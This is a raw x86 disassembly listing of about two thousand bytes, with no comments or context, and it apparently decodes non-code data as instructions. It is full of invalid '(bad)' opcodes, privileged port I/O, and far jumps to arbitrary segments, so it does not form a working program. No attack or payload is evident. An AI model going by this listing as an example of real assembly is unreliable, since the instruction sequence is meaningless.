  41ea6b:	add    al,0xa5
  41ea6d:	push   ds
  41ea6e:	hlt    
  41ea6f:	sar    cl,1
  41ea71:	and    BYTE PTR [eax+0x56],bl
  41ea74:	adc    eax,0xb9fd1d02
  41ea79:	es jnp 0x41ea93
  41ea7c:	pusha  
  41ea7d:	daa    
  41ea7e:	or     al,BYTE PTR [edx-0x54]
  41ea81:	dec    ebx
  41ea82:	add    DWORD PTR [ecx],0xf35714b5
  41ea88:	xchg   ebx,eax
  41ea89:	and    al,0x64
  41ea8b:	ins    BYTE PTR es:[edi],dx
  41ea8c:	adc    ch,ch
  41ea8e:	add    DWORD PTR [edx+eiz*4],ebx
  41ea91:	daa    
  41ea92:	mov    eax,0xdf64f559
  41ea97:	push   esi
  41ea98:	out    dx,eax
  41ea99:	mov    bl,0x8e
  41ea9b:	dec    edx
  41ea9c:	popa   
  41ea9d:	popa   
  41ea9e:	neg    DWORD PTR [ecx]
  41eaa0:	jle    0x41eab5
  41eaa2:	shl    BYTE PTR [edx+0x6efdd9da],cl
  41eaa8:	inc    esi
  41eaa9:	or     al,0x40
  41eaab:	hlt    
  41eaac:	scas   al,BYTE PTR es:[edi]
  41eaad:	jp     0x41eaae
  41eaaf:	imul   ebx,DWORD PTR [esi+ebx*2],0x8ec04f8b
  41eab6:	sbb    eax,0x8d83d5b
  41eabb:	xor    DWORD PTR [ebx+0xb],ebp
  41eabe:	mov    al,BYTE PTR [esi+0x2f]
  41eac1:	popa   
  41eac2:	daa    
  41eac3:	or     esp,DWORD PTR [ebx]
  41eac5:	or     eax,0xa1cf11b7
  41eaca:	push   cs
  41eacb:	cmp    eax,0xae24a27a
  41ead0:	xor    ah,ch
  41ead2:	aad    0xad
  41ead4:	lds    ebx,FWORD PTR [ecx-0x34]
  41ead7:	jp     0x41ea96
  41ead9:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41eadb:	mov    esi,0x584c9231
  41eae0:	ret    
  41eae1:	mov    ds,WORD PTR [edx+0x3dadb770]
  41eae7:	and    BYTE PTR [esi+esi*8-0x2d],dl
  41eaeb:	mov    bh,0xeb
  41eaed:	push   ds
  41eaee:	sub    eax,esi
  41eaf0:	mov    eax,0xe231075f
  41eaf5:	mov    ch,0x42
  41eaf7:	mov    ds:0x38283ac,al
  41eafc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eafd:	ds mov esp,0x710a307e
  41eb03:	mov    WORD PTR [eax+0x7f],gs
  41eb06:	idiv   BYTE PTR [edi+edi*2]
  41eb09:	cmp    ah,al
  41eb0b:	(bad)  
  41eb0c:	mov    ebp,0x60a00ebc
  41eb11:	dec    edx
  41eb12:	or     al,0xe3
  41eb14:	push   es
  41eb15:	jbe    0x41eb50
  41eb17:	mov    ds:0x7057de05,al
  41eb1c:	(bad)  
  41eb1e:	push   edx
  41eb1f:	fs mov eax,0x53251fd4
  41eb25:	sbb    al,0xcc
  41eb27:	or     al,0xc0
  41eb29:	aas    
  41eb2a:	out    dx,al
  41eb2b:	xor    dl,BYTE PTR [esi]
  41eb2d:	cmp    dl,dl
  41eb2f:	add    BYTE PTR [ebp-0x39],dh
  41eb32:	(bad)  
  41eb33:	sbb    DWORD PTR [eax+0xe],edi
  41eb36:	add    al,0x2a
  41eb38:	cmp    ah,BYTE PTR es:[edx+0x62]
  41eb3c:	add    al,0x4b
  41eb3e:	xchg   ecx,eax
  41eb3f:	and    al,0xf0
  41eb41:	jns    0x41eb97
  41eb43:	jne    0x41eb57
  41eb45:	and    eax,0x2680b105
  41eb4a:	shl    DWORD PTR [ecx+0x5fd5a4af],0xe1
  41eb51:	stc    
  41eb52:	push   edx
  41eb53:	add    edx,eax
  41eb55:	hlt    
  41eb56:	pusha  
  41eb57:	cmp    esi,0xe033c0b
  41eb5d:	enter  0x7e5a,0x78
  41eb61:	mov    al,ds:0x7e3ef09b
  41eb66:	push   es
  41eb67:	call   esi
  41eb69:	or     DWORD PTR [ecx+0x65],edi
  41eb6c:	push   eax
  41eb6d:	outs   dx,BYTE PTR ds:[esi]
  41eb6e:	(bad)  
  41eb6f:	sbb    eax,0xf3dcb955
  41eb74:	data16 fiadd DWORD PTR [ecx+esi*1+0x12695c44]
  41eb7c:	push   0xa3aea65f
  41eb81:	cwde   
  41eb82:	cmp    DWORD PTR [edi],eax
  41eb84:	ja     0x41eb2f
  41eb86:	stc    
  41eb87:	inc    ebx
  41eb88:	jno    0x41ebb5
  41eb8a:	xchg   ebp,eax
  41eb8b:	add    al,0xed
  41eb8d:	fs int 0xdf
  41eb90:	imul   ecx,eax,0xffffffae
  41eb93:	jecxz  0x41eb1e
  41eb95:	fisttp DWORD PTR [ecx-0x30]
  41eb98:	mov    bh,0xd7
  41eb9a:	loop   0x41eb25
  41eb9c:	or     BYTE PTR [edx+0xfc98f4f],ch
  41eba2:	shr    BYTE PTR [ecx-0x6c7b833f],cl
  41eba8:	arpl   WORD PTR [eax],bp
  41ebaa:	jne    0x41eb5a
  41ebac:	xor    eax,0xe76c6a17
  41ebb1:	hlt    
  41ebb2:	fnstcw WORD PTR [edx+0x513670b0]
  41ebb8:	ret    
  41ebb9:	pop    ecx
  41ebba:	mov    ebp,0xeb8bf46c
  41ebbf:	pop    ss
  41ebc0:	clc    
  41ebc1:	stos   DWORD PTR es:[edi],eax
  41ebc2:	push   es
  41ebc3:	mov    edx,0xe2ddf081
  41ebc8:	imul   eax,DWORD PTR [esi],0x20ddeb32
  41ebce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebcf:	or     bl,BYTE PTR ds:0x65d16b7e
  41ebd5:	mov    ecx,0x498f6e3b
  41ebda:	clc    
  41ebdb:	xchg   edi,eax
  41ebdc:	es loope 0x41eb8c
  41ebdf:	out    dx,al
  41ebe0:	test   DWORD PTR ds:0xe277185d,0xe55b2896
  41ebea:	push   ss
  41ebeb:	mov    ebp,0x734425c9
  41ebf0:	mov    dl,0xdf
  41ebf2:	or     edx,DWORD PTR [ebp+0x1207be4a]
  41ebf8:	sub    ebp,edi
  41ebfa:	push   cs
  41ebfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebfc:	or     BYTE PTR [ebp+0x2e],0xb0
  41ec00:	xor    BYTE PTR [ebp+edx*1+0x2d],bh
  41ec04:	fdivr  QWORD PTR [edi-0x53]
  41ec07:	das    
  41ec08:	lods   eax,DWORD PTR ds:[esi]
  41ec09:	and    ebp,edi
  41ec0b:	and    eax,0xa72c0ccc
  41ec10:	out    0x1e,eax
  41ec12:	sub    BYTE PTR [edx+0x2eebb31a],0xac
  41ec19:	mov    edx,0xbf24f409
  41ec1e:	push   edi
  41ec1f:	aas    
  41ec20:	nop
  41ec21:	rcr    DWORD PTR [ebx],0x28
  41ec24:	xchg   edi,eax
  41ec25:	dec    dx
  41ec27:	pusha  
  41ec28:	pushf  
  41ec29:	mov    ch,0x44
  41ec2b:	mov    esi,DWORD PTR [edi-0x4d08a60d]
  41ec31:	outs   dx,DWORD PTR ds:[esi]
  41ec32:	sub    BYTE PTR [ebx],dl
  41ec34:	in     eax,dx
  41ec35:	iret   
  41ec36:	inc    ebx
  41ec37:	ss fadd st(1),st
  41ec3a:	pop    ebp
  41ec3b:	adc    eax,0x77599d83
  41ec40:	inc    ecx
  41ec41:	pop    ds
  41ec42:	push   ss
  41ec43:	inc    dl
  41ec45:	inc    ebp
  41ec46:	xchg   edi,eax
  41ec47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec48:	xchg   edi,eax
  41ec49:	dec    ecx
  41ec4a:	inc    ecx
  41ec4b:	sbb    BYTE PTR [eiz*8-0x36dde421],cl
  41ec52:	sub    DWORD PTR [edi-0x49],ebx
  41ec55:	cmp    esi,ebp
  41ec57:	or     al,0x3c
  41ec59:	adc    DWORD PTR [edx],0x1e0261ea
  41ec5f:	xchg   esp,eax
  41ec60:	outs   dx,BYTE PTR ds:[esi]
  41ec61:	dec    ebp
  41ec62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec63:	pop    ecx
  41ec64:	int3   
  41ec65:	out    0x70,al
  41ec67:	fstp   DWORD PTR [ebx]
  41ec69:	mov    BYTE PTR [eax],al
  41ec6b:	add    DWORD PTR [esi-0x5f4e6c4],ecx
  41ec71:	inc    eax
  41ec72:	and    esp,DWORD PTR [ebx+eax*8-0xa]
  41ec76:	sub    eax,0x9672fd19
  41ec7b:	jecxz  0x41ec1a
  41ec7d:	shr    BYTE PTR [esi+ebx*1],1
  41ec80:	in     eax,0xcb
  41ec82:	ror    DWORD PTR [ebx],1
  41ec84:	aas    
  41ec85:	cmp    DWORD PTR [edx-0x57e9cc55],eax
  41ec8b:	jnp    0x41ec7d
  41ec8d:	inc    edi
  41ec8e:	mov    ebx,ecx
  41ec90:	les    edi,FWORD PTR [eax]
  41ec92:	imul   edi,DWORD PTR [esi-0x39],0x70f8709a
  41ec99:	div    DWORD PTR [eax]
  41ec9b:	mov    edi,0xf0d828e0
  41eca0:	(bad)  
  41eca1:	pushf  
  41eca2:	test   eax,0x21c0afe1
  41eca7:	rol    DWORD PTR [ecx],cl
  41eca9:	add    eax,0xb327b27f
  41ecae:	hlt    
  41ecaf:	add    DWORD PTR [edx],esp
  41ecb1:	jg     0x41ec49
  41ecb3:	enter  0x318c,0xaf
  41ecb7:	sub    ebx,eax
  41ecb9:	and    eax,0x610e6604
  41ecbe:	inc    ebx
  41ecbf:	sub    ebp,DWORD PTR [eax-0x6]
  41ecc2:	dec    ecx
  41ecc3:	ror    DWORD PTR [ebx],1
  41ecc5:	out    dx,eax
  41ecc6:	mov    ebx,0x6b63a0d6
  41eccb:	add    eax,0x61fffa32
  41ecd0:	sub    esi,DWORD PTR [edx+0x3a]
  41ecd3:	add    bh,BYTE PTR [eax]
  41ecd5:	(bad)  
  41ecd6:	cli    
  41ecd7:	mov    edx,0x8b246d25
  41ecdd:	jae    0x41ec6f
  41ecdf:	in     eax,dx
  41ece0:	pop    eax
  41ece1:	pushf  
  41ece2:	jns    0x41eca1
  41ece4:	loope  0x41ed24
  41ece6:	jl     0x41ed39
  41ece8:	xchg   DWORD PTR [edi+0x654c6337],ebx
  41ecee:	lahf   
  41ecef:	stos   BYTE PTR es:[edi],al
  41ecf0:	sub    BYTE PTR [edi],0xac
  41ecf3:	popf   
  41ecf4:	adc    dh,BYTE PTR [esi]
  41ecf6:	mov    ds,WORD PTR [esi+eiz*1+0x2f]
  41ecfa:	outs   dx,BYTE PTR ds:[esi]
  41ecfb:	dec    eax
  41ecfc:	repnz sar esi,1
  41ecff:	cs pusha 
  41ed01:	jne    0x41ecaa
  41ed03:	arpl   WORD PTR [esi-0x28c2dae1],ax
  41ed09:	sar    DWORD PTR [eax-0x93b300a],1
  41ed0f:	sub    BYTE PTR [ebx+eiz*1-0x25],cl
  41ed13:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41ed15:	in     al,0x30
  41ed17:	adc    edx,ebx
  41ed19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed1a:	pop    ss
  41ed1b:	mov    BYTE PTR [ebx],al
  41ed1d:	(bad)  
  41ed1e:	sti    
  41ed1f:	fldenv [ebp+eiz*8-0x18]
  41ed23:	in     eax,0x58
  41ed25:	mov    WORD PTR [eax+edx*1],cs
  41ed28:	xchg   ebp,eax
  41ed29:	dec    ecx
  41ed2a:	lock ror BYTE PTR [edx-0x65],1
  41ed2e:	mov    eax,0xa5e1f77e
  41ed33:	ds ins DWORD PTR es:[edi],dx
  41ed35:	jne    0x41ecf4
  41ed37:	xor    eax,0xde3dc4db
  41ed3c:	pop    ss
  41ed3d:	aaa    
  41ed3e:	stos   BYTE PTR es:[edi],al
  41ed3f:	mov    eax,0xcc98472
  41ed44:	mov    al,ds:0x34c5aaf1
  41ed49:	mov    al,0x53
  41ed4b:	xbegin 0xc8c1784b
  41ed51:	scas   al,BYTE PTR es:[edi]
  41ed52:	in     eax,dx
  41ed53:	push   edx
  41ed54:	pop    ds
  41ed55:	mov    WORD PTR [ebp-0x68],?
  41ed58:	inc    ebp
  41ed59:	in     al,dx
  41ed5a:	push   ds
  41ed5b:	retf   
  41ed5c:	jmp    0xaa09ef6d
  41ed61:	mov    edi,0xc284d122
  41ed66:	xchg   esi,eax
  41ed67:	popf   
  41ed68:	add    al,0x4b
  41ed6a:	mov    cl,0x4a
  41ed6c:	push   esp
  41ed6d:	inc    ebx
  41ed6e:	xchg   esi,eax
  41ed6f:	pop    ebp
  41ed70:	add    dh,BYTE PTR [esi+0x1752a906]
  41ed76:	out    dx,eax
  41ed77:	push   ebp
  41ed78:	ror    BYTE PTR [ecx+0x7b238cc6],0xb7
  41ed7f:	iret   
  41ed80:	mov    ebp,0x89390960
  41ed85:	lods   al,BYTE PTR ds:[esi]
  41ed86:	test   al,0x66
  41ed88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed89:	add    al,0xa7
  41ed8b:	adc    eax,0x1f996e06
  41ed90:	dec    eax
  41ed91:	test   al,0xe1
  41ed93:	retf   0xf8c1
  41ed96:	sub    bl,cl
  41ed98:	outs   dx,BYTE PTR ds:[esi]
  41ed99:	push   eax
  41ed9a:	mov    bh,0x10
  41ed9c:	or     al,0x9b
  41ed9e:	or     DWORD PTR [ecx+0x6597b5ad],ebp
  41eda4:	into   
  41eda5:	jo     0x41ede6
  41eda7:	inc    ebp
  41eda8:	out    dx,al
  41eda9:	popa   
  41edaa:	sub    DWORD PTR [eax-0x17a68a4c],eax
  41edb0:	data16 jb 0x41edb0
  41edb3:	ins    DWORD PTR es:[edi],dx
  41edb4:	test   eax,0xf51e4703
  41edb9:	shl    DWORD PTR [esp+esi*2],cl
  41edbc:	mov    dh,0x18
  41edbe:	dec    ebx
  41edbf:	and    BYTE PTR [edi],al
  41edc1:	pop    es
  41edc2:	sub    ah,al
  41edc4:	jne    0x41ede3
  41edc6:	or     al,0x42
  41edc8:	mov    dh,BYTE PTR [ebp-0x5e242b6a]
  41edce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edcf:	cdq    
  41edd0:	dec    ecx
  41edd1:	mov    bh,0xce
  41edd3:	aas    
  41edd4:	adc    eax,0x67241947
  41edd9:	push   edi
  41edda:	stc    
  41eddb:	adc    DWORD PTR [eax+0x4f367cad],edi
  41ede1:	jmp    0x41ee3e
  41ede3:	addr16 sbb eax,0x7f65ee6d
  41ede9:	sbb    al,ah
  41edeb:	cld    
  41edec:	clc    
  41eded:	stos   BYTE PTR es:[edi],al
  41edee:	xchg   DWORD PTR [esp+edi*1-0x32],ecx
  41edf2:	sub    BYTE PTR [ebx+0x42],bl
  41edf5:	das    
  41edf6:	sbb    ecx,edx
  41edf8:	je     0x41edfb
  41edfa:	cwde   
  41edfb:	mov    edx,0x705273d5
  41ee00:	and    ch,BYTE PTR [edx]
  41ee02:	sub    bl,ah
  41ee04:	div    BYTE PTR [esi+0x55]
  41ee07:	dec    ebx
  41ee08:	test   BYTE PTR [edi],bl
  41ee0a:	or     BYTE PTR [esi],dh
  41ee0c:	(bad)  
  41ee0d:	or     ebx,DWORD PTR [ebx+0x5e]
  41ee10:	fadd   QWORD PTR [ebx-0x67837052]
  41ee16:	imul   eax
  41ee18:	call   0xdff830f1
  41ee1d:	jbe    0x41ee69
  41ee1f:	mov    ch,0xb3
  41ee21:	repz test DWORD PTR [esi*2+0xd395872],esp
  41ee29:	dec    edi
  41ee2a:	mov    esp,0x253013ec
  41ee2f:	pop    ss
  41ee30:	xor    DWORD PTR [edx+0x45],ecx
  41ee33:	inc    edx
  41ee34:	xor    bh,al
  41ee36:	aas    
  41ee37:	jnp    0x41ee3d
  41ee39:	daa    
  41ee3a:	inc    eax
  41ee3b:	inc    ebp
  41ee3c:	xchg   edi,eax
  41ee3d:	lock and DWORD PTR [edi+0x56dad7de],0xffffffae
  41ee45:	lods   eax,DWORD PTR ds:[esi]
  41ee46:	in     eax,0xdf
  41ee48:	adc    DWORD PTR [eax+0x4a],esi
  41ee4b:	inc    esp
  41ee4c:	jg     0x41ee09
  41ee4e:	jae    0x41ee64
  41ee50:	mov    cl,BYTE PTR [esi+0x42]
  41ee53:	test   BYTE PTR [esi+0x64],ch
  41ee56:	ffree  st(6)
  41ee58:	jno    0x41ee49
  41ee5a:	or     DWORD PTR [esi-0x34fdaad2],ecx
  41ee60:	pop    ss
  41ee61:	xchg   esi,eax
  41ee62:	sub    edx,DWORD PTR [esi]
  41ee64:	ror    BYTE PTR [esi],1
  41ee66:	cmp    DWORD PTR [eax-0x69],edx
  41ee69:	dec    edx
  41ee6a:	sbb    ah,BYTE PTR [ebp+0x75e6af08]
  41ee70:	pop    es
  41ee71:	jo     0x41eed0
  41ee73:	shr    BYTE PTR ds:0x3df16c35,1
  41ee79:	inc    esi
  41ee7a:	mov    ebx,0xa99ba102
  41ee7f:	out    0x2,eax
  41ee81:	cli    
  41ee82:	mov    dh,0xa6
  41ee84:	cdq    
  41ee85:	(bad)  
  41ee86:	push   ecx
  41ee87:	fwait
  41ee88:	lock push cs
  41ee8a:	cmc    
  41ee8b:	jb     0x41ee40
  41ee8d:	mov    eax,0xb0ce1c8a
  41ee92:	stos   BYTE PTR es:[edi],al
  41ee93:	shl    DWORD PTR [edx+0x70281037],cl
  41ee99:	push   0xffffffe3
  41ee9b:	cmp    al,0x66
  41ee9d:	push   esp
  41ee9e:	xor    BYTE PTR ds:0xe5a951be,0x1c
  41eea5:	inc    edx
  41eea6:	inc    ecx
  41eea7:	push   es
  41eea8:	fs jae 0x41ee6d
  41eeab:	xchg   BYTE PTR [edx],cl
  41eead:	push   eax
  41eeae:	mov    ?,WORD PTR [edx]
  41eeb0:	add    ah,dh
  41eeb2:	pause  
  41eeb4:	adc    edi,DWORD PTR [ebp-0x3b]
  41eeb7:	xchg   esp,eax
  41eeb8:	mov    ebp,0x23915fa2
  41eebd:	stc    
  41eebe:	cwde   
  41eebf:	lea    edx,[eax+0x76]
  41eec2:	jne    0x41ee8b
  41eec4:	out    dx,eax
  41eec5:	hlt    
  41eec6:	loopne 0x41ef07
  41eec8:	stc    
  41eec9:	dec    ebp
  41eeca:	stc    
  41eecb:	sti    
  41eecc:	mov    dl,0xa3
  41eece:	dec    esp
  41eecf:	bound  ebx,QWORD PTR [eax-0xe]
  41eed2:	dec    esi
  41eed3:	ss stos BYTE PTR es:[edi],al
  41eed5:	pop    esi
  41eed6:	mov    ch,0x3c
  41eed8:	sub    eax,0xc00a4076
  41eedd:	pop    es
  41eede:	(bad)  
  41eee0:	pop    esi
  41eee1:	pop    ebx
  41eee2:	pop    ecx
  41eee3:	pop    edx
  41eee4:	jmp    DWORD PTR [edi+ecx*4+0x3f]
  41eee8:	sub    bl,BYTE PTR [edi]
  41eeea:	retf   
  41eeeb:	or     al,0x41
  41eeed:	hlt    
  41eeee:	push   edx
  41eeef:	push   cs
  41eef0:	mov    edi,0x108c3f0c
  41eef5:	sbb    eax,0x1c71edf6
  41eefa:	adc    BYTE PTR [eax+0x6f0d6fa8],bl
  41ef00:	push   es
  41ef01:	push   esi
  41ef02:	and    eax,0x65d2b8d2
  41ef07:	xor    DWORD PTR [edi-0xf],ebx
  41ef0a:	push   cs
  41ef0b:	pop    eax
  41ef0c:	dec    eax
  41ef0d:	arpl   WORD PTR [eax+eiz*8-0x41],bx
  41ef11:	and    BYTE PTR [edi+0xa85d684],al
  41ef17:	ja     0x41ef19
  41ef19:	dec    edx
  41ef1a:	mov    ebp,0x94cf23ce
  41ef1f:	jl     0x41ef13
  41ef21:	mov    DWORD PTR [esp+ebx*4],ebp
  41ef24:	(bad)  
  41ef25:	cli    
  41ef26:	jbe    0x41ef2e
  41ef28:	jbe    0x41ef4b
  41ef2a:	test   eax,0xb490ce1c
  41ef2f:	call   0x736a:0xe69e75d4
  41ef36:	lods   eax,DWORD PTR ds:[esi]
  41ef37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef38:	icebp  
  41ef39:	xchg   DWORD PTR ds:0x297026dc,eax
  41ef3f:	hlt    
  41ef40:	push   esi
  41ef41:	dec    esp
  41ef42:	pop    ebx
  41ef43:	xchg   ebp,eax
  41ef44:	retf   0x5b62
  41ef47:	sti    
  41ef48:	test   DWORD PTR [ebx-0x51],0x6437c50c
  41ef4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef50:	adc    BYTE PTR [edi-0x7b22d460],dh
  41ef56:	push   esp
  41ef57:	push   ss
  41ef58:	xor    BYTE PTR [ebx],dl
  41ef5a:	enter  0xd562,0xfe
  41ef5e:	add    eax,0xebbc3856
  41ef63:	test   BYTE PTR [esp+eax*8+0x11ba9b6a],ch
  41ef6a:	jmp    0x863bed54
  41ef6f:	loopne 0x41ef7d
  41ef71:	ret    0xc249
  41ef74:	psadbw mm7,mm1
  41ef77:	xor    BYTE PTR [edx-0x74b29b40],0x8
  41ef7e:	inc    edx
  41ef7f:	nop
  41ef80:	mov    ch,0x85
  41ef82:	pop    es
  41ef83:	call   0xb7e5:0xfbd894a5
  41ef8a:	jno    0x41ef62
  41ef8c:	push   ecx
  41ef8d:	jb     0x41ef36
  41ef8f:	pop    ebx
  41ef90:	mov    esi,0x5d596c23
  41ef95:	ins    DWORD PTR es:[edi],dx
  41ef96:	sub    BYTE PTR [ecx+0xe48113d],bh
  41ef9c:	pop    ebp
  41ef9d:	es push ecx
  41ef9f:	xchg   esi,eax
  41efa0:	sbb    esp,esp
  41efa2:	ror    BYTE PTR ds:0x41c3049f,cl
  41efa8:	(bad)  
  41efa9:	hlt    
  41efaa:	sbb    edi,DWORD PTR [ecx]
  41efac:	mov    dl,0x3b
  41efae:	jno    0x41f00c
  41efb0:	xor    ecx,DWORD PTR [ebp-0x9d30af1]
  41efb6:	bnd jae 0x41ef74
  41efb9:	pop    edi
  41efba:	or     eax,0xa5583813
  41efbf:	xchg   esi,ecx
  41efc1:	dec    ecx
  41efc2:	sbb    eax,0x5f6a60ae
  41efc7:	in     al,dx
  41efc8:	adc    DWORD PTR [esi-0x17edfa81],edi
  41efce:	pop    edx
  41efcf:	sahf   
  41efd0:	jns    0x41f037
  41efd2:	fild   DWORD PTR [ecx+ecx*4+0x60]
  41efd6:	add    al,0x36
  41efd8:	mov    ebp,0x70a8ddca
  41efdd:	out    0x1c,al
  41efdf:	mov    edx,DWORD PTR [edx+0x2520098c]
  41efe5:	outs   dx,BYTE PTR ds:[esi]
  41efe6:	jp     0x41efc0
  41efe8:	mov    ds:0x33f6854,eax
  41efed:	pop    ebp
  41efee:	add    DWORD PTR [eax],esi
  41eff0:	pushf  
  41eff1:	push   edi
  41eff2:	dec    eax
  41eff3:	jp     0x41efcd
  41eff5:	dec    ebx
  41eff6:	fstp   TBYTE PTR [edx]
  41eff8:	hlt    
  41eff9:	mov    dh,0x53
  41effb:	fs mov ch,0xf5
  41effe:	push   ds
  41efff:	scas   eax,DWORD PTR es:[edi]
  41f000:	mov    ?,WORD PTR [ebx-0x298c209b]
  41f006:	(bad)  [eax]
  41f008:	dec    esp
  41f009:	rcl    BYTE PTR fs:[edx+0x18],1
  41f00d:	pop    ebx
  41f00e:	(bad)  
  41f00f:	push   edx
  41f010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f011:	jno    0x41f04f
  41f013:	jnp    0x41f01f
  41f015:	aad    0xdb
  41f017:	nop
  41f018:	push   edx
  41f019:	or     eax,0x9fe3ee67
  41f01e:	lock out dx,eax
  41f020:	inc    ebx
  41f021:	sbb    al,0x33
  41f023:	jmp    0x579:0x874b9cbb
  41f02a:	das    
  41f02b:	(bad)  
  41f02c:	xor    eax,0x575b7113
  41f031:	push   dx
  41f033:	gs std 
  41f035:	xchg   esp,eax
  41f036:	add    BYTE PTR [edx+0x4e],dh
  41f039:	push   cs
  41f03a:	add    al,0xe1
  41f03c:	add    DWORD PTR [ebp-0x6a736b18],ebp
  41f042:	inc    edi
  41f043:	push   0x61d85ff0
  41f048:	fs (bad) 
  41f04a:	jl     0x41f007
  41f04c:	scas   eax,DWORD PTR es:[edi]
  41f04d:	or     ch,BYTE PTR [eax+edx*4+0x41b76937]
  41f054:	test   al,0xdd
  41f056:	arpl   bx,dx
  41f058:	mov    WORD PTR [ebx],gs
  41f05a:	adc    eax,0x1095fad7
  41f05f:	xor    DWORD PTR [ebp-0x46],esi
  41f062:	scas   eax,DWORD PTR es:[edi]
  41f063:	test   eax,0x9fad43dc
  41f068:	repnz add DWORD PTR cs:[ebp-0x19],edi
  41f06d:	mov    eax,ds:0x73fcfd29
  41f072:	call   0xde7b14f0
  41f077:	pop    ds
  41f078:	mov    ebx,0xc4b3d2f
  41f07d:	std    
  41f07e:	test   DWORD PTR [edx],0x33d58a73
  41f084:	rcr    BYTE PTR [ebx],1
  41f086:	lock mov WORD PTR [edi],es
  41f089:	ret    
  41f08a:	setno  dl
  41f08d:	into   
  41f08e:	lock mov dh,0xfc
  41f091:	ror    ah,0xe3
  41f094:	icebp  
  41f095:	lods   eax,DWORD PTR ds:[esi]
  41f096:	pop    edi
  41f097:	call   0xd4b7:0x40a1e6fe
  41f09e:	add    eax,0xe5e26b9a
  41f0a3:	push   es
  41f0a4:	mov    dh,0xc0
  41f0a6:	mov    ds:0xe23fff27,eax
  41f0ab:	(bad)  
  41f0ac:	in     al,dx
  41f0ad:	fcom   QWORD PTR [eax+0x25857e0b]
  41f0b3:	enter  0x8086,0xc9
  41f0b7:	xchg   esi,eax
  41f0b8:	sbb    eax,DWORD PTR [edi+0x4c]
  41f0bb:	pop    edi
  41f0bc:	sbb    eax,0xa21592e
  41f0c1:	(bad)  
  41f0c2:	jg     0x41f130
  41f0c4:	sbb    al,0x49
  41f0c6:	(bad)  
  41f0c7:	aas    
  41f0c8:	(bad)  
  41f0c9:	lds    edi,FWORD PTR [edi+0x48]
  41f0cc:	fild   DWORD PTR [eax]
  41f0ce:	dec    eax
  41f0cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0d0:	sub    dh,cl
  41f0d2:	ret    
  41f0d3:	and    DWORD PTR [eax-0xb],ebp
  41f0d6:	push   esi
  41f0d7:	aam    0x37
  41f0d9:	out    0x8a,eax
  41f0db:	js     0x41f150
  41f0dd:	ret    0x8936
  41f0e0:	jecxz  0x41f062
  41f0e2:	lods   eax,DWORD PTR ds:[esi]
  41f0e3:	push   cs
  41f0e4:	and    al,BYTE PTR [ebx]
  41f0e6:	jecxz  0x41f0ba
  41f0e8:	(bad)  
  41f0ea:	pop    ss
  41f0eb:	fisubr DWORD PTR [edx+0x31]
  41f0ee:	sbb    al,0xd9
  41f0f0:	inc    ebx
  41f0f1:	pop    es
  41f0f2:	jb     0x41f130
  41f0f4:	popa   
  41f0f5:	pushf  
  41f0f6:	mov    cl,bh
  41f0f8:	inc    edi
  41f0f9:	mov    ebx,0xbe1f3d0a
  41f0fe:	jp     0x41f14d
  41f100:	mov    ebx,esp
  41f102:	mov    WORD PTR [edx-0x19bda334],ss
  41f108:	not    ebp
  41f10a:	lahf   
  41f10b:	lock gs mov ebp,0x8f9d1f5
  41f112:	xor    ecx,eax
  41f114:	xor    bl,BYTE PTR [edi+0x62]
  41f117:	mov    dl,0x64
  41f119:	jb     0x41f18b
  41f11b:	or     DWORD PTR [ebx-0x2bdf3f1],ebx
  41f121:	dec    esi
  41f122:	add    eax,DWORD PTR [edi+0x33acec5]
  41f128:	(bad)  
  41f129:	retf   0x8f33
  41f12c:	mov    ecx,0xed023691
  41f131:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f132:	out    0xcc,eax
  41f134:	gs inc ebp
  41f136:	es jp  0x41f1a0
  41f139:	and    ebx,ecx
  41f13b:	adc    bl,cl
  41f13d:	inc    ecx
  41f13e:	mov    al,ds:0x103d75bd
  41f143:	adc    eax,0x1675415e
  41f148:	loopne 0x41f1c1
  41f14a:	xlat   BYTE PTR ds:[ebx]
  41f14b:	pop    ds
  41f14c:	xchg   esp,eax
  41f14d:	mov    edx,0xb916f9ea
  41f152:	fs mov edx,0x497810
  41f158:	test   BYTE PTR [eax+ecx*1],bh
  41f15b:	and    eax,0xd0b1e919
  41f160:	push   ebx
  41f161:	inc    esi
  41f162:	or     BYTE PTR [ecx-0x265bf6f1],0xb0
  41f169:	jnp    0x41f145
  41f16b:	mov    ds:0xfa411199,eax
  41f170:	daa    
  41f171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f172:	stc    
  41f173:	jae    0x41f11c
  41f175:	mov    ebx,0x5c0b8d9c
  41f17a:	jge    0x41f1a3
  41f17c:	ror    BYTE PTR [edi-0x2c19f6bb],1
  41f182:	call   0x6622e1d6
  41f187:	cmp    dh,dh
  41f189:	lods   eax,DWORD PTR ds:[esi]
  41f18a:	or     al,0x8d
  41f18c:	mov    al,ds:0xe37f6bb6
  41f191:	rol    ebx,1
  41f193:	shl    eax,cl
  41f195:	popf   
  41f196:	push   0xffffffc5
  41f198:	dec    ebx
  41f199:	or     ebx,edi
  41f19b:	xchg   ecx,eax
  41f19c:	std    
  41f19d:	cwde   
  41f19e:	ja     0x41f124
  41f1a0:	mov    ah,0x9a
  41f1a2:	inc    edx
  41f1a3:	inc    esi
  41f1a4:	inc    esi
  41f1a5:	into   
  41f1a6:	lahf   
  41f1a7:	xchg   ecx,eax
  41f1a8:	icebp  
  41f1a9:	(bad)  
  41f1aa:	das    
  41f1ab:	rol    DWORD PTR [ebp-0x3a],0x41
  41f1af:	jns    0x41f135
  41f1b1:	mov    cs,WORD PTR [esp+ecx*2+0x1b]
  41f1b5:	fcomp  DWORD PTR [edi]
  41f1b7:	inc    eax
  41f1b8:	mov    ds:0x4e6557d1,al
